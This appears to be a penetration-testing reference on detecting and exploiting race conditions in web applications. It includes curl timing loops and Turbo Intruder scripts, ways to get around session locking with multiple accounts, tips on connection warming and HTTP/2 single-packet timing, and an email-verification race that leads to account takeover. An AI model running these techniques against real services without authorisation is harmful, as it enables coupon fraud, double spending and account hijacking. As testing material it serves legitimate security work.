# Detection Reference

## 1. Benchmarking — Understand Normal Behavior First

Before any attack, you need a baseline. This lets you recognize anomalies.

### What to Record

```
Send the target request 5-10 times sequentially and note:
- Response time (average and variance)
- Response status code
- Response body structure
- DB/application state after each request
  (e.g., is the coupon marked used? is the token consumed?)
- Any confirmation emails triggered
```

### Benchmark Script (curl)

```bash
# Time 10 sequential requests
for i in {1..10}; do
  time curl -s -X POST https://target.com/redeem \
    -H "Cookie: session=YOUR_SESSION" \
    -H "Content-Type: application/json" \
    -d '{"couponCode":"PROMO20"}' \
    -o /dev/null -w "%{http_code} %{time_total}s\n"
done
```

### What to Look For in Baseline

```
- Consistent ~200ms response → small race window → need single-packet attack
- Variable 200-2000ms response → larger race window → easier to exploit
- Second request returns "already used" → state update is working sequentially
  (but may not be atomic → race condition still possible!)
```

---

## 2. Session Locking Detection

Many frameworks serialize requests that share a session ID — this will **kill your race attack** if you don't account for it.

### Affected Frameworks / Languages

```
HIGH RISK (known session locking):
- PHP (file-based sessions lock by default)
- Ruby on Rails (CookieStore is fine; DB/file sessions lock)
- Django (database-backed sessions)
- Some Java EE session implementations

LOW RISK (usually no locking):
- Node.js (JWT-based auth, stateless)
- Go (typically stateless)
- Python + JWT
- Modern SPAs with token-based auth
```

### How to Test for Session Locking

```
Step 1: Open TWO Burp Repeater tabs with identical requests, same session cookie
Step 2: Send both at exactly the same time (send group in parallel)
Step 3: Observe response times

IF: both complete at ~same time → no locking → race is viable
IF: second request waits until first completes → SESSION LOCKING detected
    (you'll see the second response arrives exactly after the first finishes)
```

### Fix: Use Multiple Sessions

```
If session locking is detected:
1. Register 2+ test accounts
2. Use a different session cookie per parallel request thread
3. This bypasses session-level serialization

Example: coupon system
→ Create 2 accounts (attacker1, attacker2)
→ Both have the same unused coupon code
→ Fire both redemption requests simultaneously using different sessions
→ Both may succeed before either DB update completes
```

### Detecting Session Locking in Turbo Intruder

```python
# In your TI script, use different sessions per request:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          engine=Engine.BURP2)
    
    sessions = ['session_token_1', 'session_token_2', 'session_token_3']
    
    for session in sessions:
        engine.queue(target.req.replace('SESSION_PLACEHOLDER', session))
```

---

## 3. Identifying the Race Window Size

The race window is the time between the CHECK and the UPDATE. Larger = easier to exploit.

### Window Size Indicators

```
LARGE window (easy exploit, HTTP/1.1 fine):
- Target is a distributed/microservice architecture
  (cross-service calls take 50-500ms)
- External API calls during the check
  (email validation, payment gateway, fraud check)
- Slow DB queries (joins, counts on large tables)
- Caching layer (Redis read → DB write = inconsistency window)

SMALL window (need HTTP/2 single-packet, more concurrent requests):
- Single-process monolith
- Same DB transaction (but check: is it actually atomic?)
- Fast in-memory operations
- Response time consistently under 100ms
```

### Probe for Window Width

```bash
# Measure variance in response time on the sensitive check endpoint
for i in {1..20}; do
  curl -s -o /dev/null -w "%{time_starttransfer}\n" \
    -X POST https://target.com/check-coupon \
    -H "Content-Type: application/json" \
    -d '{"code":"TEST123"}'
done | awk '{sum+=$1; count++} END {print "avg:", sum/count, "s"}'
```

---

## 4. State Observation Techniques

You need to observe state change to confirm a race condition worked.

### Direct State Observation

```
After firing parallel requests, check:
- Account balance (if financial)
- Coupon/token usage status (if accessible via API)
- Email inbox (if duplicate confirmation emails sent = race worked)
- Database record (if you have DB access in CTF/lab)
- Order history (if duplicate orders created)
```

### Indirect Observation via Response Analysis

```
Compare responses from parallel requests:
- All return 200 + "success" → multiple succeeded → race confirmed
- Mix of 200 success + 409 conflict → first few won the race
- All return 200 but only one has actual effect → check state more carefully
- Different response bodies → state machine confusion → interesting!
```

### Email-Based Detection (James Kettle technique)

```
For email verification / password reset races:
- Send parallel requests to change email to two different attacker addresses
- Check BOTH inboxes for verification emails
- If BOTH receive an email → token was generated for both → race window found
- If token from one address works to verify the other → account takeover possible
```

---

## 5. Timing Your Attacks

### Connection Warming (Critical for HTTP/1.1)

Cold connections (first request on a TCP connection) are slow due to:
- TCP handshake
- TLS negotiation
- Server-side connection setup

**Warm the connection first:**

```python
# In Turbo Intruder, always send a warm-up request before the attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1)
    
    # Warm up: send a dummy request to establish connection
    engine.queue(target.req, 'warm_up_payload')
    
    # Now queue actual attack requests
    for _ in range(20):
        engine.queue(target.req, 'attack_payload', gate='race_gate')
    
    engine.openGate('race_gate')
```

### In Burp Repeater Group

```
1. Create request group with target request
2. Add a "warm-up" GET to same host FIRST in the group
3. Set group to "send group in sequence (single connection)"
4. Send once to warm
5. Then switch to "send group in parallel"
6. Fire attack
```

### Network Jitter Mitigation

```
Sources of jitter (things that affect timing):
- Geographic distance to target → use VPS near target datacenter
- Shared hosting → variable server response times
- CDN/proxy → extra hop adds variance

Mitigation:
- HTTP/2 single-packet attack eliminates most network jitter
  (all requests arrive at server simultaneously in one TCP packet)
- Turbo Intruder with Engine.BURP2 for HTTP/2
- Test from VPS close to target if possible
```
